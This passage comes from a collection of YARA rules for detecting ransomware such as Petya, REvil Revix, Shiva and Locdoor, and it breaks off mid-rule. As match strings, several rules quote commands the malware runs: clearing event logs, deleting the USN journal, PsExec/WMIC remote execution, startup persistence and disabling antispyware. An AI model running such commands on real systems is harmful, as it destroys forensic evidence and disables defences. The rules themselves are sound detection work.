  "FE_CPE_MS17_010_RANSOMWARE": "rule FE_CPE_MS17_010_RANSOMWARE {\nmeta:version=\"1.1\"\n      //filetype=\"PE\"\n      author=\"Ian.Ahl@fireeye.com @TekDefense, Nicholas.Carr@mandiant.com @ItsReallyNick\"\n      date=\"2017-06-27\"\n      description=\"Probable PETYA ransomware using ETERNALBLUE, WMIC, PsExec\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/06/petya-ransomware-spreading-via-eternalblue-exploit.html\"\nstrings:\n      // DRIVE USAGE\n      $dmap01 = \"\\\\\\\\.\\\\PhysicalDrive\" nocase ascii wide\n      $dmap02 = \"\\\\\\\\.\\\\PhysicalDrive0\" nocase ascii wide\n      $dmap03 = \"\\\\\\\\.\\\\C:\" nocase ascii wide\n      $dmap04 = \"TERMSRV\" nocase ascii wide\n      $dmap05 = \"\\\\admin$\" nocase ascii wide\n      $dmap06 = \"GetLogicalDrives\" nocase ascii wide\n      $dmap07 = \"GetDriveTypeW\" nocase ascii wide\n\n      // RANSOMNOTE\n      $msg01 = \"WARNING: DO NOT TURN OFF YOUR PC!\" nocase ascii wide\n      $msg02 = \"IF YOU ABORT THIS PROCESS\" nocase ascii wide\n      $msg03 = \"DESTROY ALL OF YOUR DATA!\" nocase ascii wide\n      $msg04 = \"PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\" nocase ascii wide\n      $msg05 = \"your important files are encrypted\" ascii wide\n      $msg06 = \"Your personal installation key\" nocase ascii wide\n      $msg07 = \"worth of Bitcoin to following address\" nocase ascii wide\n      $msg08 = \"CHKDSK is repairing sector\" nocase ascii wide\n      $msg09 = \"Repairing file system on \" nocase ascii wide\n      $msg10 = \"Bitcoin wallet ID\" nocase ascii wide\n      $msg11 = \"wowsmith123456@posteo.net\" nocase ascii wide\n      $msg12 = \"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\" nocase ascii wide\n      $msg_pcre = /(en|de)crypt(ion|ed\\.)/     \n\n      // FUNCTIONALITY, APIS\n      $functions01 = \"need dictionary\" nocase ascii wide\n      $functions02 = \"comspec\" nocase ascii wide\n      $functions03 = \"OpenProcessToken\" nocase ascii wide\n      $functions04 = \"CloseHandle\" nocase ascii wide\n      $functions05 = \"EnterCriticalSection\" nocase ascii wide\n      $functions06 = \"ExitProcess\" nocase ascii wide\n      $functions07 = \"GetCurrentProcess\" nocase ascii wide\n      $functions08 = \"GetProcAddress\" nocase ascii wide\n      $functions09 = \"LeaveCriticalSection\" nocase ascii wide\n      $functions10 = \"MultiByteToWideChar\" nocase ascii wide\n      $functions11 = \"WideCharToMultiByte\" nocase ascii wide\n      $functions12 = \"WriteFile\" nocase ascii wide\n      $functions13 = \"CoTaskMemFree\" nocase ascii wide\n      $functions14 = \"NamedPipe\" nocase ascii wide\n      $functions15 = \"Sleep\" nocase ascii wide // imported, not in strings     \n\n      // COMMANDS\n      //  -- Clearing event logs & USNJrnl\n      $cmd01 = \"wevtutil cl Setup\" ascii wide nocase\n      $cmd02 = \"wevtutil cl System\" ascii wide nocase\n      $cmd03 = \"wevtutil cl Security\" ascii wide nocase\n      $cmd04 = \"wevtutil cl Application\" ascii wide nocase\n      $cmd05 = \"fsutil usn deletejournal\" ascii wide nocase\n      // -- Scheduled task\n      $cmd06 = \"schtasks \" nocase ascii wide\n      $cmd07 = \"/Create /SC \" nocase ascii wide\n      $cmd08 = \" /TN \" nocase ascii wide\n      $cmd09 = \"at %02d:%02d %ws\" nocase ascii wide\n      $cmd10 = \"shutdown.exe /r /f\" nocase ascii wide\n      // -- Sysinternals/PsExec and WMIC\n      $cmd11 = \"-accepteula -s\" nocase ascii wide\n      $cmd12 = \"wmic\"\n      $cmd13 = \"/node:\" nocase ascii wide\n      $cmd14 = \"process call create\" nocase ascii wide\n\ncondition:\n      // (uint16(0) == 0x5A4D)\n      3 of ($dmap*)\n      and 2 of ($msg*)\n      and 9 of ($functions*)\n      and 7 of ($cmd*)\n}",
  "petya_eternalblue": "rule petya_eternalblue : petya_eternalblue {\n    meta:\n        author      = \"blueliv\"\n        description =  \"Based on spreading petya version: 2017-06-28\"\n        reference = \"https://blueliv.com/petya-ransomware-cyber-attack-is-spreading-across-the-globe-part-2/\"\n    strings:\n        /* Some commands executed by the Petya variant */\n       $cmd01 = \"schtasks %ws/Create /SC once /TN \\\"\\\" /TR \\\"%ws\\\" /ST %02d:%0\" wide\n       $cmd02 = \"shutdown.exe /r /f\" wide\n       $cmd03 = \"%s \\\\\\\\%s -accepteula -s\" wide\n       $cmd04 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\\\\"C:\\\\Windows\\\\%s\\\\\\\" #1\" wide\n       /* Strings of encrypted files */\n       $str01 = \"they have been encrypted. Perhaps you are busy looking\" wide\n        /* MBR/VBR payload */\n        $mbr01 = {00 00 00 55 aa e9 ?? ??}\n    condition:\n        all of them\n}",
  "pico_ransomware": "rule pico_ransomware {\n   \n   meta:\n   \n      description = \"Rule to detect Pico Ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/siri_urz/status/1035138577934557184\"\n      \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\rikfe\\\\Desktop\\\\Ransomware\\\\ThanatosSource\\\\Release\\\\Ransomware.pdb\" fullword ascii\n      $s2 = \"\\\\Downloads\\\\README.txt\" fullword ascii\n      $s3 = \"\\\\Music\\\\README.txt\" fullword ascii\n      $s4 = \"\\\\Videos\\\\README.txt\" fullword ascii\n      $s5 = \"\\\\Pictures\\\\README.txt\" fullword ascii\n      $s6 = \"\\\\Desktop\\\\README.txt\" fullword ascii\n      $s7 = \"\\\\Documents\\\\README.txt\" fullword ascii\n      $s8 = \"/c taskkill /im \" fullword ascii\n      $s9 = \"\\\\AppData\\\\Roaming\\\\\" fullword ascii\n      $s10 = \"gMozilla/5.0 (Windows NT 6.1) Thanatos/1.1\" fullword wide\n      $s11 = \"AppData\\\\Roaming\" fullword ascii\n      $s12 = \"\\\\Downloads\" fullword ascii\n      $s13 = \"operator co_await\" fullword ascii\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 700KB ) and all of them\n}",
  "Revil_Ransomware": "rule Revil_Ransomware : ransomware {\n   meta:\n      author = \"Josh Lemon\"\n      description = \"Detects REvil Linux - Revix 1.1 and 1.2\"\n      reference = \"https://angle.ankura.com/post/102hcny/revix-linux-ransomware\"\n      date = \"2021-11-04\"\n      version = \"1.1\"\n      hash1 = \"f864922f947a6bb7d894245b53795b54b9378c0f7633c521240488e86f60c2c5\"\n      hash2 = \"559e9c0a2ef6898fabaf0a5fb10ac4a0f8d721edde4758351910200fe16b5fa7\"\n      hash3 = \"ea1872b2835128e3cb49a0bc27e4727ca33c4e6eba1e80422db19b505f965bc4\"\n   strings:\n      $s1 = \"Usage example: elf.exe --path /vmfs/ --threads 5\" fullword ascii \n      $s2 = \"uname -a && echo \\\" | \\\" && hostname\" fullword ascii\n      $s3 = \"esxcli --formatter=csv --format-param=fields==\\\"WorldID,DisplayName\\\" vm process list\" ascii\n      $s4 = \"awk -F \\\"\\\\\\\"*,\\\\\\\"*\\\" '{system(\\\"esxcli\" ascii\n      $s5 = \"--silent (-s) use for not stoping VMs mode\" fullword ascii\n      $s6 = \"!!!BY DEFAULT THIS SOFTWARE USES 50 THREADS!!!\" fullword ascii\n      $s7 = \"%d:%d: Comment not allowed here\" fullword ascii\n      $s8 = \"Error decoding user_id %d \" fullword ascii \n      $s9 = \"Error read urandm line %d!\" fullword ascii\n      $s10 = \"%d:%d: Unexpected `%c` in comment opening sequence\" fullword ascii\n      $s11 = \"%d:%d: Unexpected EOF in block comment\" fullword ascii\n      $s12 = \"Using silent mode, if you on esxi - stop VMs manualy\" fullword ascii\n      $s13 = \"rand: try to read %hu but get %lu bytes\" fullword ascii\n      $s14 = \"Revix\" fullword ascii\n      $s15 = \"without --path encrypts current dir\" fullword ascii\n      \n      $e1 = \"[%s] already encrypted\" fullword ascii\n      $e2 = \"File [%s] was encrypted\" fullword ascii\n      $e3 = \"File [%s] was NOT encrypted\" fullword ascii\n      $e4 = \"Encrypting [%s]\" fullword ascii\n\n   condition:\n      uint16(0) == 0x457f and filesize < 300KB and ( 4 of ($s*) and 2 of ($e*))\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\nrule Ransom_Satana\n{\n    meta:\n        description = \"Regla para detectar Ransom.Satana\"\n        author = \"CCN-CERT\"\n        version = \"1.0\"\n    strings:\n        $a = { 21 00 73 00 61 00 74 00 61 00 6E 00 61 00 21 00 2E 00 74 00 78 00 74 00 00 }\n        $b = { 74 67 77 79 75 67 77 71 }\n        $c = { 53 77 76 77 6E 67 75 }\n        $d = { 45 6E 75 6D 4C 6F 63 61 6C 52 65 73 }\n        $e = { 57 4E 65 74 4F 70 65 6E 45 6E 75 6D 57 00 }\n        $f = { 21 53 41 54 41 4E 41 21 }\n    condition:\n        $b or $c and $d and $a and $e and $f\n}\n\nrule Ransom_Satana_Dropper\n{\n    meta:\n        description = \"Regla para detectar el dropper de Ransom.Satana\"\n        author = \"CCN-CERT\"\n        version = \"1.0\"\n    strings:\n        $a = { 25 73 2D 54 72 79 45 78 63 65 70 74 }\n        $b = { 64 3A 5C 6C 62 65 74 77 6D 77 79 5C 75 69 6A 65 75 71 70 6C 66 77 75 62 2E 70 64 62 }\n        $c = { 71 66 6E 74 76 74 68 62 }\n    condition:\n        all of them\n}\n\nrule unpacked_shiva_ransomware {\n\n   meta:\n\n      description = \"Rule to detect an unpacked sample of Shiva ransopmw\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/malwrhunterteam/status/1037424962569732096\"\n    \n   strings:\n\n      $s1 = \"c:\\\\Users\\\\sys\\\\Desktop\\\\v 0.5\\\\Shiva\\\\Shiva\\\\obj\\\\Debug\\\\shiva.pdb\" fullword ascii\n      $s2 = \"This email will be as confirmation you are ready to pay for decryption key.\" fullword wide\n      $s3 = \"Your important files are now encrypted due to a security problem with your PC!\" fullword wide\n      $s4 = \"write.php?info=\" fullword wide\n      $s5 = \" * Do not try to decrypt your data using third party software, it may cause permanent data loss.\" fullword wide\n      $s6 = \" * Do not rename encrypted files.\" fullword wide\n      $s7 = \".compositiontemplate\" fullword wide\n      $s8 = \"You have to pay for decryption in Bitcoins. The price depends on how fast you write to us.\" fullword wide\n      $s9 = \"\\\\READ_IT.txt\" fullword wide\n      $s10 = \".lastlogin\" fullword wide\n      $s11 = \".logonxp\" fullword wide\n      $s12 = \" * Decryption of your files with the help of third parties may cause increased price\" fullword wide\n      $s13 = \"After payment we will send you the decryption tool that will decrypt all your files.\" fullword wide\n   \n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 800KB ) and all of them \n}\n\n\nrule sigma_ransomware {\n\n  meta:\n    author = \"J from THL <j@techhelplist.com>\"\n    date = \"20180509\"\n    reference1 = \"https://www.virustotal.com/#/file/705ad78bf5503e6022f08da4c347afb47d4e740cfe6c39c08550c740c3be96ba\"\n    reference2 = \"https://www.virustotal.com/#/file/bb3533440c27a115878ae541aba3bda02d441f3ea1864b868862255aabb0c8ff\"\n    version = 1\n    maltype = \"Ransomware\"\n    filetype = \"memory\"\n\n  strings:\n    $a = \".php?\"\n    $b = \"uid=\"\n    $c = \"&uname=\"\n    $d = \"&os=\"\n    $e = \"&pcname=\"\n    $f = \"&total=\"\n    $g = \"&country=\"\n    $h = \"&network=\"\n    $i = \"&subid=\"\n\n  condition:\n    all of them\n}\n\nrule SnakeRansomware\n{\n    meta:\n        Author = \"Nishan Maharjan\"\n        Description = \"A yara rule to catch snake ransomware\"\n        Reference = \"https://medium.com/@nishanmaharjan17/malware-analysis-snake-ransomware-a0e66f487017\"\n        Data = \"15th May 2020\"\n    strings:\n        $go_build_id = \"Go build ID: \\\"X6lNEpDhc_qgQl56x4du/fgVJOqLlPCCIekQhFnHL/rkxe6tXCg56Ez88otHrz/Y-lXW-OhiIbzg3-ioGRz\\\"\"\n        $math_rand_seed_calling = { 89 C8 BB 00 CA 9A 3B 89 D1 F7 E3 81 E1 FF FF FF 3F 89 C3 01 C8 89 C6 05 00 00 1A 3D 89 04 24 69 ED 00 CA 9A 3B 01 EA 89 CD C1 F9 1F 01 EB 11 CA 81 C6 00 00 1A 3D 81 D2 EB 03 B2 A1 89 54 24 04 E8 10 62 F6 FF }\n        $encryption_function = {64 8B 0D 14 00 00 00 8B 89 00 00 00 00 3B 61 08 0F 86 38 01 00 00 83 EC 3C E8 32 1A F3 FF 8D 7C 24 28 89 E6 E8 25 EA F0 FF 8B 44 24 2C 8B 4C 24 28 89 C2 C1 E8 1F C1 E0 1F 85 C0 0F 84 FC 00 00 00 D1 E2 89 CB C1 E9 1F 09 D1 89 DA D1 E3 C1 EB 1F 89 CD D1 E1 09 D9 89 CB 81 C1 80 7F B1 D7 C1 ED 1F 81 C3 80 7F B1 D7 83 D5 0D 89 C8 BB 00 CA 9A 3B 89 D1 F7 E3 81 E1 FF FF FF 3F 89 C3 01 C8 89 C6 05 00 00 1A 3D 89 04 24 69 ED 00 CA 9A 3B 01 EA 89 CD C1 F9 1F 01 EB 11 CA 81 C6 00 00 1A 3D 81 D2 EB 03 B2 A1 89 54 24 04 E8 10 62 F6 FF 31 C0 EB 79 89 44 24 20 8B 4C 24 40 8D 14 C1 8B 1A 89 5C 24 24 8B 52 04 89 54 24 1C C7 04 24 05 00 00 00 E8 48 FE FF FF 8B 44 24 08 8B 4C 24 04 C7 04 24 00 00 00 00 8B 54 24 24 89 54 24 04 8B 5C 24 1C 89 5C 24 08 89 4C 24 0C 89 44 24 10 E8 EC DD EF FF 8B 44 24 18 8B 4C 24 14 89 4C 24 08 89 44 24 0C 8B 44 24 24 89 04 24 8B 44 24 1C 89 44 24 04 E8 68 BB F3 FF 8B 44 24 20 40}\n    condition:\n        all of them     \n}\n\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule stampado_overlay\n{\nmeta:\ndescription = \"Catches Stampado samples looking for \\\\r at the beginning of PE overlay section\"\nreference = \"\"\nauthor = \"Fernando Merces, FTR, Trend Micro\"\ndate = \"2016-07\"\nmd5 = \"a393b9536a1caa34914636d3da7378b5\"\nmd5 = \"dbf3707a9cd090853a11dda9cfa78ff0\"\nmd5 = \"dd5686ca7ec28815c3cf3ed3dbebdff2\"\nmd5 = \"6337f0938e4a9c0ef44ab99deb0ef466\"\n\ncondition:\npe.characteristics == 0x122 and\npe.number_of_sections == 5 and\npe.imports(\"VERSION.dll\", \"VerQueryValueW\") and uint8(pe.sections[4].raw_data_offset + pe.sections[4].raw_data_size) == 0x0d\n\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nrule TeslaCrypt {\nmeta:\n    description = \"Regla para detectar Tesla con md5\"\n    author = \"CCN-CERT\"\n    version = \"1.0\"\nstrings:\n    $ = { 4E 6F 77 20 69 74 27 73 20 25 49 3A 25 4D 25 70 2E 00 00 00 76 61 6C 20 69 73 20 25 64 0A 00 00 }\ncondition:\n    all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\n\nrule Win32Toxic : tox ransomware\n{\nmeta:\n\tauthor = \"@GelosSnake\"\n\tdate = \"2015-06-02\"\n\tdescription = \"https://blogs.mcafee.com/mcafee-labs/meet-tox-ransomware-for-the-rest-of-us\"\n\thash0 = \"70624c13be4d8a4c1361be38b49cb3eb\"\n\thash1 = \"4f20d25cd3ae2e5c63d451d095d97046\"\n\thash2 = \"e0473434cc83b57c4b579d585d4c4c57\"\n\thash3 = \"c52090d184b63e5cc71b524153bb079e\"\n\thash4 = \"7ac0b49baba9914b234cde62058c96a5\"\n\thash5 = \"048c007de4902b6f4731fde45fa8e6a9\"\n\thash6 = \"238ef3e35b14e304c87b9c62f18953a9\"\n\thash7 = \"8908ccd681f66429c578a889e6e708e1\"\n\thash8 = \"de9fe2b7d9463982cc77c78ee51e4d51\"\n\thash9 = \"37add8d26a35a3dc9700b92b67625fa4\"\n\thash10 = \"a0f30e89a3431fca1d389f90dba1d56e\"\n\thash11 = \"d4d0658302c731003bf0683127618bd9\"\n\thash12 = \"d1d89e1c7066f41c1d30985ac7b569db\"\n\thash13 = \"97d52d7281dfae8ff9e704bf30ce2484\"\n\thash14 = \"2cc85be01e86e0505697cf61219e66da\"\n\thash15 = \"02ecfb44b9b11b846ea8233d524ecda3\"\n\thash16 = \"703a6ebe71131671df6bc92086c9a641\"\n\thash17 = \"df23629b4a4aed05d6a453280256c05a\"\n\thash18 = \"07466ff2572f16c63e1fee206b081d11\"\n\thash19 = \"792a1c0971775d32bad374b288792468\"\n\thash20 = \"fb7fd5623fa6b7791a221fad463223cd\"\n\thash21 = \"83a562aab1d66e5d170f091b2ae6a213\"\n\thash22 = \"99214c8c9ff4653b533dc1b19a21d389\"\n\thash23 = \"a92aec198eee23a3a9a145e64d0250ee\"\n\thash24 = \"e0f7e6b96ca72b9755965b9dac3ce77e\"\n\thash25 = \"f520fc947a6d5edb87aa01510bee9c8d\"\n\thash26 = \"6d7babbe5e438539a9fa2c5d6128d3b4\"\n\thash27 = \"3133c2231fcee5d6b0b4c988a5201da1\"\n\thash28 = \"e5b1d198edc413376e0c0091566198e4\"\n\thash29 = \"50515b5a6e717976823895465d5dc684\"\n\thash30 = \"510389e8c7f22f2076fc7c5388e01220\"\n\thash31 = \"60573c945aa3b8cfaca0bdb6dd7d2019\"\n\thash32 = \"394187056697463eba97382018dfe151\"\n\thash33 = \"045a5d3c95e28629927c72cf3313f4cd\"\n\thash34 = \"70951624eb06f7db0dcab5fc33f49127\"\n\thash35 = \"5def9e3f7b15b2a75c80596b5e24e0f4\"\n\thash36 = \"35a42fb1c65ebd7d763db4abb26d33b0\"\n\thash37 = \"b0030f5072864572f8e6ba9b295615fc\"\n\thash38 = \"62706f48689f1ba3d1d79780010b8739\"\n\thash39 = \"be86183fa029629ee9c07310cd630871\"\n\thash40 = \"9755c3920d3a38eb1b5b7edbce6d4914\"\n\thash41 = \"cb42611b4bed97d152721e8db5abd860\"\n\thash42 = \"5475344d69fc6778e12dc1cbba23b382\"\n\thash43 = \"8c1bf70742b62dec1b350a4e5046c7b6\"\n\thash44 = \"6a6541c0f63f45eff725dec951ec90a7\"\n\thash45 = \"a592c5bee0d81ee127cbfbcb4178afe8\"\n\thash46 = \"b74c6d86ec3904f4d73d05b2797f1cc3\"\n\thash47 = \"28d76fd4dd2dbfc61b0c99d2ad08cd8e\"\n\thash48 = \"fc859ae67dc1596ac3fdd79b2ed02910\"\n\thash49 = \"cb65d5e929da8ff5c8434fd8d36e5dfb\"\n\thash50 = \"888dd1acce29cd37f0696a0284ab740a\"\n\thash51 = \"0e3e231c255a5eefefd20d70c247d5f0\"\n\thash52 = \"e5ebe35d934106f9f4cebbd84e04534b\"\n\thash53 = \"3b580f1fa0c961a83920ce32b4e4e86d\"\n\thash54 = \"d807a704f78121250227793ea15aa9c4\"\n\thash55 = \"db462159bddc0953444afd7b0d57e783\"\n\thash56 = \"2ed4945fb9e6202c10fad0761723cb0e\"\n\thash57 = \"51183ab4fd2304a278e36d36b5fb990c\"\n\thash58 = \"65d602313c585c8712ea0560a655ddeb\"\n\thash59 = \"0128c12d4a72d14bb67e459b3700a373\"\n\thash60 = \"5d3dfc161c983f8e820e59c370f65581\"\n\thash61 = \"d4dd475179cd9f6180d5b931e8740ed6\"\n\thash62 = \"5dd3782ce5f94686448326ddbbac934c\"\n\thash63 = \"c85c6171a7ff05d66d497ad0d73a51ed\"\n\thash64 = \"b42dda2100da688243fe85a819d61e2e\"\n\thash65 = \"a5cf8f2b7d97d86f4d8948360f3db714\"\n\thash66 = \"293cae15e4db1217ea72581836a6642c\"\n\thash67 = \"56c3a5bae3cb1d0d315c1353ae67cf58\"\n\thash68 = \"c86dc1d0378cc0b579a11d873ac944e7\"\n\thash69 = \"54cef0185798f3ec1f4cb95fad4ddd7c\"\n\thash70 = \"eb2eff9838043b67e8024ccadcfe1a8f\"\n\thash71 = \"78778fe62ee28ef949eec2e7e5961ca8\"\n\thash72 = \"e75c5762471a490d49b79d01da745498\"\n\thash73 = \"1564d3e27b90a166a0989a61dc3bd646\"\n\thash74 = \"59ba111403842c1f260f886d69e8757d\"\n\thash75 = \"d840dfbe52a04665e40807c9d960cccc\"\n\thash76 = \"77f543f4a8f54ecf84b15da8e928d3f9\"\n\thash77 = \"bd9512679fdc1e1e89a24f6ebe0d5ad8\"\n\thash78 = \"202f042d02be4f6469ed6f2e71f42c04\"\n\thash79 = \"28f827673833175dd9094002f2f9b780\"\n\thash80 = \"0ff10287b4c50e0d11ab998a28529415\"\n\thash81 = \"644daa2b294c5583ce6aa8bc68f1d21f\"\n\thash82 = \"1c9db47778a41775bbcb70256cc1a035\"\n\thash83 = \"c203bc5752e5319b81cf1ca970c3ca96\"\n\thash84 = \"656f2571e4f5172182fc970a5b21c0e7\"\n\thash85 = \"c17122a9864e3bbf622285c4d5503282\"\n\thash86 = \"f9e3a9636b45edbcef2ee28bd6b1cfbb\"\n\thash87 = \"291ff8b46d417691a83c73a9d3a30cc9\"\n\thash88 = \"1217877d3f7824165bb28281ccc80182\"\n\thash89 = \"18419d775652f47a657c5400d4aef4a3\"\n\thash90 = \"04417923bf4f2be48dd567dfd33684e2\"\n\thash91 = \"31efe902ec6a5ab9e6876cfe715d7c84\"\n\thash92 = \"a2e4472c5097d7433b91d65579711664\"\n\thash93 = \"98854d7aba1874c39636ff3b703a1ed1\"\n\thash94 = \"5149f0e0a56b33e7bbed1457aab8763f\"\n\thash95 = \"7a4338193ce12529d6ae5cfcbb1019af\"\n\thash96 = \"aa7f37206aba3cbe5e11d336424c549a\"\n\thash97 = \"51cad5d45cdbc2940a66d044d5a8dabf\"\n\thash98 = \"85edb7b8dee5b60e3ce32e1286207faa\"\n\thash99 = \"34ca5292ae56fea78ba14abe8fe11f06\"\n\thash100 = \"154187f07621a9213d77a18c0758960f\"\n\thash101 = \"4e633f0478b993551db22afddfa22262\"\n\thash102 = \"5c50e4427fe178566cada96b2afbc2d4\"\n\thash103 = \"263001ac21ef78c31f4ca7ad2e7f191d\"\n\thash104 = \"53fd9e7500e3522065a2dabb932d9dc5\"\n\thash105 = \"48043dc55718eb9e5b134dac93ebb5f6\"\n\thash106 = \"ca19a1b85363cfed4d36e3e7b990c8b6\"\n\thash107 = \"41b5403a5443a3a84f0007131173c126\"\n\thash108 = \"6f3833bc6e5940155aa804e58500da81\"\n\thash109 = \"9bd50fcfa7ca6e171516101673c4e795\"\n\thash110 = \"6d52ba0d48d5bf3242cd11488c75b9a7\"\n\thash111 = \"c52afb663ff4165e407f53a82e34e1d5\"\n\thash112 = \"5a16396d418355731c6d7bb7b21e05f7\"\n\thash113 = \"05559db924e71cccee87d21b968d0930\"\n\thash114 = \"824312bf8e8e7714616ba62997467fa8\"\n\thash115 = \"dfec435e6264a0bfe47fc5239631903c\"\n\thash116 = \"3512e7da9d66ca62be3418bead2fb091\"\n\thash117 = \"7ad4df88db6f292e7ddeec7cf63fa2bc\"\n\thash118 = \"d512da73d0ca103df3c9e7c074babc99\"\n\thash119 = \"c622b844388c16278d1bc768dcfbbeab\"\n\thash120 = \"170ffa1cd19a1cecc6dae5bdd10efb58\"\n\thash121 = \"3a19c91c1c0baa7dd4a9def2e0b7c3e9\"\n\thash122 = \"3b7ce3ceb8d2b85ab822f355904d47ce\"\n\thash123 = \"a7bac2ace1f04a7ad440bd2f5f811edc\"\n\thash124 = \"66594a62d8c98e1387ec8deb3fe39431\"\n\thash125 = \"a1add9e5d7646584fd4140528d02e4c3\"\n\thash126 = \"11328bbf5a76535e53ab35315321f904\"\n\thash127 = \"048f19d79c953e523675e96fb6e417a9\"\n\thash128 = \"eb65fc2922eafd62defd978a3215814b\"\n\thash129 = \"51cc9987f86a76d75bf335a8864ec250\"\n\thash130 = \"a7f91301712b5a3cc8c3ab9c119530ce\"\n\thash131 = \"de976a5b3d603161a737e7b947fdbb9a\"\n\thash132 = \"288a3659cc1aec47530752b3a31c232b\"\n\thash133 = \"91da679f417040558059ccd5b1063688\"\n\thash134 = \"4ce9a0877b5c6f439f3e90f52eb85398\"\n\thash135 = \"1f9e097ff9724d4384c09748a71ef99d\"\n\thash136 = \"7d8a64a94e71a5c24ad82e8a58f4b7e6\"\n\thash137 = \"db119e3c6b57d9c6b739b0f9cbaeb6fd\"\n\thash138 = \"52c9d25179bf010a4bb20d5b5b4e0615\"\n\thash139 = \"4b9995578d51fb891040a7f159613a99\"\n\tsample_filetype = \"exe\"\n\tyaragenerator = \"https://github.com/Xen0ph0n/YaraGenerator\"\nstrings:\n\t$string0 = \"n:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t;<<t;<<t;<<t;<<t;<<t;<<t;<<t;<<t<<<t;<<t;<<t;<<\"\n\t$string1 = \"t;<<t;<<t<<<t<<\"\n\t$string2 = \">>><<<\"\ncondition:\n\t2 of them\n}\n\n        \n\nrule screenlocker_acroware {\n\n   meta:\n\n      description = \"Rule to detect Acroware ScreenLocker\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-august-31st-2018-devs-on-vacation/\"\n      \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\patri\\\\Documents\\\\Visual Studio 2015\\\\Projects\\\\Advanced Ransi\\\\Advanced Ransi\\\\obj\\\\Debug\\\\Advanced Ransi.pdb\" fullword ascii\n      $s2 = \"All your Personal Data got encrypted and the decryption key is stored on a hidden\" fullword ascii\n      $s3 = \"alphaoil@mail2tor.com any try of removing this Ransomware will result in an instantly \" fullword ascii\n      $s4 = \"HKEY_CURRENT_USER\\\\SoftwareE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" fullword wide\n      $s5 = \"webserver, after 72 hours the decryption key will get removed and your personal\" fullword ascii\n      \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB ) and all of them\n}\n\nrule jeff_dev_ransomware {\n\n   meta:\n   \n      description = \"Rule to detect Jeff DEV Ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-august-31st-2018-devs-on-vacation/\"\n      \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\Umut\\\\Desktop\\\\takemeon\" fullword wide\n      $s2 = \"C:\\\\Users\\\\Umut\\\\Desktop\\\\\" fullword ascii\n      $s3 = \"PRESS HERE TO STOP THIS CREEPY SOUND AND VIEW WHAT HAPPENED TO YOUR COMPUTER\" fullword wide\n      $s4 = \"WHAT YOU DO TO MY COMPUTER??!??!!!\" fullword wide\n\n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 5000KB ) and all of them\n}\n\nrule locdoor_ransomware {\n\n   meta:\n\n      description = \"Rule to detect Locdoor/DryCry\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/leotpsc/status/1036180615744376832\"\n\n   strings:\n\n      $s1 = \"copy \\\"Locdoor.exe\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\temp00000000.exe\\\"\" fullword ascii\n      $s2 = \"copy wscript.vbs C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\wscript.vbs\" fullword ascii\n      $s3 = \"!! Your computer's important files have been encrypted! Your computer's important files have been encrypted!\" fullword ascii\n      $s4 = \"echo CreateObject(\\\"SAPI.SpVoice\\\").Speak \\\"Your computer's important files have been encrypted! \" fullword ascii    \n      $s5 = \"! Your computer's important files have been encrypted! \" fullword ascii\n      $s7 = \"This program is not supported on your operating system.\" fullword ascii\n      $s8 = \"echo Your computer's files have been encrypted to Locdoor Ransomware! To make a recovery go to localbitcoins.com and create a wa\" ascii\n      $s9 = \"Please enter the password.\" fullword ascii\n\n   condition:\n\n      ( uint16(0) == 0x5a4d and filesize < 600KB ) and all of them \n}\n\nrule screenlocker_5h311_1nj3c706 {\n\n   meta:\n\n      description = \"Rule to detect the screenlocker 5h311_1nj3c706\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://twitter.com/demonslay335/status/1038060120461266944\"\n\n   strings:\n\n      $s1 = \"C:\\\\Users\\\\Hoang Nam\\\\source\\\\repos\\\\WindowsApp22\\\\WindowsApp22\\\\obj\\\\Debug\\\\WindowsApp22.pdb\" fullword ascii\n      $s2 = \"cmd.exe /cREG add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\ActiveDesktop /v NoChangingWallPaper /t REG_DWOR\" wide\n      $s3 = \"C:\\\\Users\\\\file1.txt\" fullword wide\n      $s4 = \"C:\\\\Users\\\\file2.txt\" fullword wide\n      $s5 = \"C:\\\\Users\\\\file.txt\" fullword wide\n      $s6 = \" /v Wallpaper /t REG_SZ /d %temp%\\\\IMG.jpg /f\" fullword wide\n      $s7 = \" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\" fullword wide\n      $s8 = \"All your file has been locked. You must pay money to have a key.\" fullword wide\n      $s9 = \"After we receive Bitcoin from you. We will send key to your email.\" fullword wide\n   \n   condition:\n\n      ( uint16(0) == 